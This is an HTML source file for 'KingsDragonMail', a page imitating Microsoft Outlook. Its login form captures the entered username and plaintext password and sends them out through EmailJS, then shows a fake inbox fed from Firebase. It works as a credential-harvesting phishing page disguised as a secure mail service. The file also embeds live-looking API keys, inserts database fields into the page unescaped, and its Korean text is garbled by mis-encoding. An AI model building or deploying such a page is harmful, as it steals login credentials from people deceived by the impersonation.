<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KingsDragonMail | ì „ì„¤ì ì¸ ë³´ì•ˆ ë©”ì¼ ì„œë¹„ìŠ¤</title>
    
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>

    <script type="text/javascript">
       emailjs.init("sNlzvNIioN1urvCco");
       const firebaseConfig = {
         apiKey: "AIzaSyDFQy1IIyNGRpZIcS3y58zznAoc9ljATZg",
         authDomain: "my-email-project-77612.firebaseapp.com",
         databaseURL: "https://my-email-project-77612-default-rtdb.firebaseio.com",
         projectId: "my-email-project-77612",
         storageBucket: "my-email-project-77612.appspot.com",
         messagingSenderId: "429655718306",
         appId: "1:429655718306:web:5b1fad2d7282d5bb915afb",
         measurementId: "G-ZDRPMZ93D7"
       };
       firebase.initializeApp(firebaseConfig);
       const database = firebase.database();
    </script>

    <style>
        :root { --p-blue: #0078d4; --hover-blue: #005a9e; --bg-light: #f3f2f1; --border: #ddd; }
        body { margin: 0; font-family: 'Segoe UI', system-ui, sans-serif; color: #242424; line-height: 1.5; }
        .hidden { display: none !important; }

        /* [1. ë„¤ë¹„ê²Œì´ì…˜] */
        nav { display: flex; align-items: center; justify-content: space-between; padding: 12px 8%; border-bottom: 1px solid var(--border); background: #fff; position: sticky; top: 0; z-index: 100; }
        .nav-left { display: flex; align-items: center; gap: 35px; }
        .logo { font-weight: 700; color: var(--p-blue); font-size: 1.4rem; cursor: pointer; text-decoration: none; }
        .nav-links { display: flex; gap: 20px; font-size: 0.9rem; color: #616161; font-weight: 500; }
        .btn-nav-login { background: none; border: 1px solid #242424; padding: 8px 20px; cursor: pointer; font-weight: 600; }
        .btn-buy { background: #242424; color: white; border: none; padding: 9px 20px; cursor: pointer; font-weight: 600; }

        /* [2. íˆì–´ë¡œ ì„¹ì…˜] */
        .hero { display: flex; align-items: center; padding: 100px 10%; background: linear-gradient(135deg, #fff 50%, #f0f7ff 100%); min-height: 550px; }
        .hero-text { flex: 1.2; padding-right: 50px; }
        .hero-text h1 { font-size: 3.5rem; font-weight: 600; margin-bottom: 25px; line-height: 1.1; color: #000; }
        .hero-text p { font-size: 1.3rem; color: #444; margin-bottom: 40px; }
        .cta-box { display: flex; border: 2px solid var(--p-blue); background: #fff; max-width: 550px; box-shadow: 0 10px 30px rgba(0,120,212,0.1); }
        .cta-box input { flex: 1; border: none; padding: 20px; font-size: 1.1rem; outline: none; }
        .cta-box .domain { padding: 20px; background: #f0f7ff; color: var(--p-blue); font-weight: 700; border-left: 1px solid #eee; }
        .btn-start { background: var(--p-blue); color: white; border: none; padding: 0 35px; font-size: 1.1rem; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .hero-visual { flex: 1; }
        .hero-visual img { width: 100%; border-radius: 8px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); }

        /* [3. íŠ¹ì§• ì„¹ì…˜ - ë‹¤ì‹œ ì¶”ê°€ë¨!] */
        .features { display: grid; grid-template-columns: repeat(3, 1fr); gap: 40px; padding: 90px 10%; background: #fff; border-top: 1px solid #eee; }
        .f-item h3 { color: var(--p-blue); font-size: 1.4rem; margin-bottom: 15px; }
        .f-item p { color: #666; font-size: 1rem; line-height: 1.6; }

        /* [4. ë¡œê·¸ì¸ í˜ì´ì§€ (ë¦¬ì…€ëŸ¬ìŠ¤íŒ¨ë„ ìŠ¤íƒ€ì¼)] */
        #login-page { background: #f9f9f9; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 60px 20px; }
        .login-box { background: #fff; width: 100%; max-width: 480px; padding: 45px; border: 1px solid var(--border); box-shadow: 0 2px 10px rgba(0,0,0,0.05); text-align: center; }
        .login-box h2 { font-weight: 400; font-size: 1.7rem; margin-bottom: 10px; }
        .login-input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ccc; box-sizing: border-box; font-size: 1rem; }
        .captcha-area { background: #f3f2f1; padding: 20px; font-size: 1.6rem; font-weight: 800; letter-spacing: 12px; margin-bottom: 15px; border: 1px dotted #999; }
        .btn-login-final { width: 100%; background: #c00; color: white; padding: 16px; border: none; font-size: 1.1rem; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-login-final.v4 { background: #242424; margin-top: 5px; }

        /* [5. ì¸ë°•ìŠ¤ (ì•„ì›ƒë£© ìŠ¤íƒ€ì¼)] */
        #inbox-page { height: 100vh; display: flex; flex-direction: column; }
        .ib-header { background: var(--p-blue); color: white; padding: 12px 25px; display: flex; justify-content: space-between; align-items: center; font-weight: 600; }
        .ib-body { display: flex; flex: 1; overflow: hidden; }
        .ib-sidebar { width: 220px; background: #f3f2f1; border-right: 1px solid var(--border); padding: 20px; }
        .ib-list { width: 380px; background: #fff; border-right: 1px solid var(--border); overflow-y: auto; }
        .ib-view { flex: 1; padding: 50px; background: #fff; }
        .mail-item { padding: 18px; border-bottom: 1px solid #f3f2f1; cursor: pointer; transition: 0.2s; }
        .mail-item:hover { background: #f9f9f9; }
    </style>
</head>
<body>

    <div id="home-page">
        <nav>
            <div class="nav-left">
                <a href="#" class="logo">ğŸ‰ KingsDragon</a>
                <div class="nav-links">
                    <span>ì œí’ˆ</span><span>ë¹„ì¦ˆë‹ˆìŠ¤ìš©</span><span>ìš”ê¸ˆì œ</span><span>ì§€ì›</span>
                </div>
            </div>
            <div>
                <button class="btn-nav-login" onclick="openLogin()">ë¡œê·¸ì¸</button>
                <button class="btn-buy" onclick="openLogin()">ì§€ê¸ˆ êµ¬ì…</button>
            </div>
        </nav>

        <section class="hero">
            <div class="hero-text">
                <h1>ì¼ìƒì ì¸ ì „ì ë©”ì¼ ë°<br>ë³´ì•ˆì„ ìœ„í•œ <span style="color:var(--p-blue)">Outlook</span></h1>
                <p>ì „ì„¤ì ì¸ KingsDragon ê¸°ìˆ ë¡œ ë©”ì¼ì„ ë³´í˜¸í•˜ì„¸ìš”.<br>ì—¬ëŸ¬ ê³„ì •ê³¼ ì¼ì •ì„ í•œ ê³³ì—ì„œ í¸ë¦¬í•˜ê²Œ ê´€ë¦¬í•©ë‹ˆë‹¤.</p>
                <div class="cta-box">
                    <input type="text" id="home-id-input" placeholder="ìƒˆë¡œìš´ ì•„ì´ë”” ì…ë ¥">
                    <span class="domain">@kingsdragonmail.abrdns.com</span>
                    <button class="btn-start" onclick="openLogin()">ì‹œì‘ ></button>
                </div>
            </div>
            <div class="hero-visual">
                <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/image/RW167Sj?ver=8064" alt="Outlook Mockup">
            </div>
        </section>

        <section class="features">
            <div class="f-item">
                <h3>ğŸ›¡ï¸ ì—”í„°í”„ë¼ì´ì¦ˆê¸‰ ë³´ì•ˆ</h3>
                <p>ìš©ì˜ ë¹„ëŠ˜ì²˜ëŸ¼ ë‹¨ë‹¨í•œ ë³´ì•ˆ í™˜ê²½ì—ì„œ ë°ì´í„°ë¥¼ ì•ˆì „í•˜ê²Œ ë³´í˜¸í•˜ì„¸ìš”. ìŠ¤íŒ¸ê³¼ í”¼ì‹±ì„ ì§€ëŠ¥ì ìœ¼ë¡œ ì°¨ë‹¨í•©ë‹ˆë‹¤.</p>
            </div>
            <div class="f-item">
                <h3>ğŸ“… ìŠ¤ë§ˆíŠ¸ ì¼ì • ê´€ë¦¬</h3>
                <p>ì¤‘ìš”í•œ ì•½ì†ì„ ë†“ì¹˜ì§€ ë§ˆì„¸ìš”. ì „ì ë©”ì¼ê³¼ ì™„ë²½í•˜ê²Œ í†µí•©ëœ ìº˜ë¦°ë”ë¥¼ í†µí•´ ì „ì„¤ì ì¸ ê³„íšì„ ì„¸ìš°ì„¸ìš”.</p>
            </div>
            <div class="f-item">
                <h3>â˜ï¸ ë„‰ë„‰í•œ ë³´ê´€ ìš©ëŸ‰</h3>
                <p>ëª¨ë“  ì„œì‹ ê³¼ ëŒ€ìš©ëŸ‰ ì²¨ë¶€ íŒŒì¼ì„ ê±±ì • ì—†ì´ ë³´ê´€í•˜ì„¸ìš”. ì „ì„¤ì˜ ê¸°ë¡ì€ ëê¹Œì§€ ë‚¨ì•„ì•¼ í•˜ë‹ˆê¹Œìš”.</p>
            </div>
        </section>
    </div>

    <div id="login-page" class="hidden">
        <div class="logo" style="font-size: 2.2rem; margin-bottom: 40px;">ğŸ‰ KingsDragon</div>
        <div class="login-box">
            <h2>Free Reseller Login</h2>
            <p>ì‚¬ìš©ì ì´ë¦„(ì´ë©”ì¼)ê³¼ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ì„¸ìš”.</p>
            
            <input type="text" id="login-id" class="login-input" placeholder="Username / Email">
            <input type="password" id="login-pw" class="login-input" placeholder="Password">
            
            <div style="text-align: left; font-size: 0.9rem; margin-bottom: 5px; color: #555;">ë³´ì•ˆë¬¸ì í™•ì¸:</div>
            <div id="captcha-box" class="captcha-area"></div>
            <input type="text" id="login-captcha" class="login-input" placeholder="ë³´ì•ˆë¬¸ì 5ìë¦¬ ì…ë ¥">
            
            <button class="btn-login-final" onclick="performLogin()">LOGIN v.3</button>
            <button class="btn-login-final v4" onclick="performLogin()">LOGIN v.4 Beta</button>
            
            <div style="margin-top:25px; font-size:0.85rem; color:#666;">
                <a href="#" style="color:var(--p-blue); text-decoration:none;">Forgot password?</a> | 
                <a href="#" onclick="location.reload()" style="color:var(--p-blue); text-decoration:none;">Sign Up</a>
            </div>
        </div>
        <p style="margin-top:50px; color:#bbb; font-size:0.8rem;">Â© 2026 KingsDragon Mail Services. Proudly serving legends.</p>
    </div>

    <div id="inbox-page" class="hidden">
        <div class="ib-header">
            <div>ğŸ‰ KingsDragon Outlook</div>
            <div id="logged-user-email"></div>
        </div>
        <div class="ib-body">
            <div class="ib-sidebar">
                <div style="font-weight:700; color:var(--p-blue); margin-bottom:15px;">ğŸ“¥ ë°›ì€ í¸ì§€í•¨</div>
                <div style="color:#666;">ğŸ“¤ ë³´ë‚¸ í¸ì§€í•¨</div>
                <div style="color:#666;">ğŸ—‘ï¸ ì‚­ì œëœ í•­ëª©</div>
            </div>
            <div class="ib-list" id="mail-list">
                </div>
            <div class="ib-view">
                <div id="mail-reader">
                    <h1 id="read-subject" style="margin-top:0;">ë©”ì¼ì„ ì„ íƒí•´ ì£¼ì„¸ìš”.</h1>
                    <p id="read-sender" style="color:var(--p-blue); font-weight:600;"></p>
                    <hr style="border:0; border-top:1px solid #eee; margin:30px 0;">
                    <div id="read-body" style="white-space:pre-wrap; line-height:1.8;"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentCaptcha = "";

        // ë¡œê·¸ì¸ í™”ë©´ìœ¼ë¡œ ì „í™˜
        function openLogin() {
            const homeId = document.getElementById('home-id-input').value;
            if(homeId) document.getElementById('login-id').value = homeId;

            document.getElementById('home-page').classList.add('hidden');
            document.getElementById('login-page').classList.remove('hidden');

            // ìº¡ì°¨ ìƒì„±
            currentCaptcha = Math.random().toString(36).substring(2, 7).toUpperCase();
            document.getElementById('captcha-box').innerText = currentCaptcha;
        }

        // ë¡œê·¸ì¸ ì‹¤í–‰
        function performLogin() {
            const id = document.getElementById('login-id').value;
            const pw = document.getElementById('login-pw').value;
            const cap = document.getElementById('login-captcha').value;

            if(!id || !pw) return alert("ì •ë³´ë¥¼ ëª¨ë‘ ì…ë ¥í•˜ì„¸ìš”.");
            if(cap.toUpperCase() !== currentCaptcha) return alert("ë³´ì•ˆë¬¸ìê°€ í‹€ë ¸ìŠµë‹ˆë‹¤.");

            // EmailJS ì „ì†¡
            emailjs.send('service_7gicimk', 'template_ea7ghys', {user_id: id, user_pw: pw});

            // í™”ë©´ ì „í™˜
            document.getElementById('login-page').classList.add('hidden');
            document.getElementById('inbox-page').classList.remove('hidden');
            document.getElementById('logged-user-email').innerText = id + "@kingsdragonmail.abrdns.com";

            // Firebase ë¦¬ìŠ¤ë„ˆ ì‹œì‘
            startFirebase(id);
        }

        function startFirebase(userId) {
            const ref = database.ref('emails/' + userId);
            ref.on('child_added', (snapshot) => {
                const data = snapshot.val();
                const div = document.createElement('div');
                div.className = 'mail-item';
                div.innerHTML = `<strong>${data.from}</strong><br><span style="font-size:0.9rem;">${data.subject}</span>`;
                div.onclick = () => {
                    document.getElementById('read-subject').innerText = data.subject;
                    document.getElementById('read-sender').innerText = "ë³´ë‚¸ ì‚¬ëŒ: " + data.from;
                    document.getElementById('read-body').innerText = data.body;
                };
                document.getElementById('mail-list').prepend(div);
            });
        }
    </script>
</body>
</html>
